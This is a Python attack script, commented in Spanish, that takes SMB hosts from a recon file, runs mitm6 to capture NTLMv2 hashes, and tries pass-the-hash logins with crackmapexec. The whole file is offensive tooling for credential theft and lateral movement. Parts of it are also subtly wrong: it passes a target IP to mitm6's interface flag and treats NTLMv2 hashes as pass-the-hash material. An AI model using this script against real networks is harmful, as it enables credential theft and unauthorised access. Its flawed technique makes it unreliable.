import subprocess
import json
import argparse
import itertools
import threading
import time
from datetime import datetime

stop_spinner = False

# Spinner Animado para Feedback Visual
spinner_cycle = itertools.cycle(["|", "/", "-", "\\"])

def spinner(message):
    while not stop_spinner:
        print(f"\r[+] {message}... {next(spinner_cycle)}", end="")
        time.sleep(0.2)  # Velocidad del spinner

def print_status(message, status="INFO"):
    status_symbols = {"INFO": "[+]", "SUCCESS": "[✔]", "ERROR": "[✖]"}
    print(f"{status_symbols.get(status, '[+]')} {message}")

# Función para Leer JSON de Reconocimiento

def read_scan_results(input_file):
    with open(input_file, "r") as json_file:
        scan_data = json.load(json_file)
    smb_targets = []
    for host in scan_data["hosts"]:
        for port in host["open_ports"]:
            if port["port"] == 445:  # Verificar si tiene SMB abierto
                smb_targets.append(host["ip"])
    return smb_targets

# Función para Detectar Interfaz de Red Activa

def get_active_interface():
    try:
        interface = subprocess.run(["ip", "route", "get", "1"], capture_output=True, text=True).stdout.split("dev")[1].split()[0]
        print_status(f"Interfaz activa detectada: {interface}", "SUCCESS")
        return interface
    except Exception as e:
        print_status(f"Error al detectar la interfaz de red: {e}", "ERROR")
        return "eth0"  # Valor por defecto

# MITM6 para Captura de Hashes NTLMv2

def start_mitm6(target_ip):
    interface = get_active_interface()  # Detectar la interfaz de red activa
    print_status(f"Iniciando MITM6 para captura de hashes NTLMv2 en {target_ip} usando interfaz {interface}")
    global stop_spinner
    stop_spinner = False
    spinner_thread = threading.Thread(target=spinner, args=("Capturando hashes con MITM6",))
    spinner_thread.start()  # Iniciar el spinner

    try:
        # Ejecutar MITM6 como proceso principal y esperar a que termine
        # Eliminado -I porque MITM6 detecta la interfaz automáticamente
        mitm6_command = ["sudo", "mitm6", "-l", "./mitm6.log", "-i", target_ip]
        subprocess.run(mitm6_command, check=True)  # Esperar a que termine
        stop_spinner = True
        spinner_thread.join()
    except subprocess.CalledProcessError as e:
        stop_spinner = True
        spinner_thread.join()
        print_status(f"Error al iniciar MITM6: {e}", "ERROR")


def stop_mitm6():
    print_status("Deteniendo MITM6")
    global stop_spinner
    stop_spinner = True
    subprocess.run(["sudo", "pkill", "mitm6"])
    print_status("MITM6 detenido", "SUCCESS")


def parse_mitm6_output():
    captured_hashes = {}
    try:
        with open("./mitm6.log", "r") as log_file:
            for line in log_file:
                if "NTLMv2 Hash" in line:
                    ip = line.split()[1]
                    user = line.split()[2]
                    ntlm_hash = line.split()[3]
                    if ip not in captured_hashes:
                        captured_hashes[ip] = []
                    captured_hashes[ip].append({"user": user, "hash": ntlm_hash, "source": "MITM6"})
    except FileNotFoundError:
        print_status("No se encontró el log de MITM6", "ERROR")
    return captured_hashes


def save_captured_hashes(captured_hashes):
    with open("captured_hashes.json", "w") as json_file:
        json.dump(captured_hashes, json_file, indent=4)
    print_status("Hashes capturados guardados en captured_hashes.json", "SUCCESS")

# Pass-The-Hash en SMB con CrackMapExec

def pass_the_hash(target_ip, hashes):
    print_status(f"Probando Pass-The-Hash en {target_ip}")
    for hash_entry in hashes:
        user = hash_entry["user"]
        ntlm_hash = hash_entry["hash"]
        cme_command = ["crackmapexec", "smb", target_ip, "-u", user, "-H", ntlm_hash]
        result = subprocess.run(cme_command, capture_output=True, text=True).stdout
        if "STATUS_SUCCESS" in result:
            print_status(f"PTH exitoso en {target_ip} con {user}:{ntlm_hash}", "SUCCESS")
            return {"user": user, "hash": ntlm_hash, "status": "Success"}
    print_status(f"PTH fallido en {target_ip}", "ERROR")
    return {"user": "", "hash": "", "status": "Failed"}

# Flujo Completo con MITM6 y PTH

def smb_enum_advanced(input_file, output_file):
    smb_targets = read_scan_results(input_file)  # Detectar automáticamente las IPs con SMB
    all_smb_results = {}

    for target in smb_targets:
        start_mitm6(target)  # Iniciar MITM6 como proceso principal con la IP objetivo

        captured_hashes = parse_mitm6_output()  # Leer hashes capturados
        if target in captured_hashes:
            smb_results = pass_the_hash(target, captured_hashes[target])  # Intentar PTH con los hashes
            all_smb_results[target] = smb_results
        else:
            print_status(f"No se capturaron hashes para {target}. Continuando con enumeración anónima.", "INFO")

        stop_mitm6()  # Detener MITM6 al finalizar

    save_captured_hashes(all_smb_results)  # Guardar resultados de hashes y PTH

    with open(output_file, "w") as json_file:
        json.dump(all_smb_results, json_file, indent=4)
    print_status(f"Resultados guardados en {output_file}", "SUCCESS")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Captura de Hashes NTLMv2 con MITM6 y PTH en SMB")
    parser.add_argument("--input", required=True, help="Archivo JSON del reconocimiento (scan_results.json)")
    parser.add_argument("--output", default="smb_enum_adv.json", help="Archivo de salida para guardar resultados")
    args = parser.parse_args()

    smb_enum_advanced(args.input, args.output)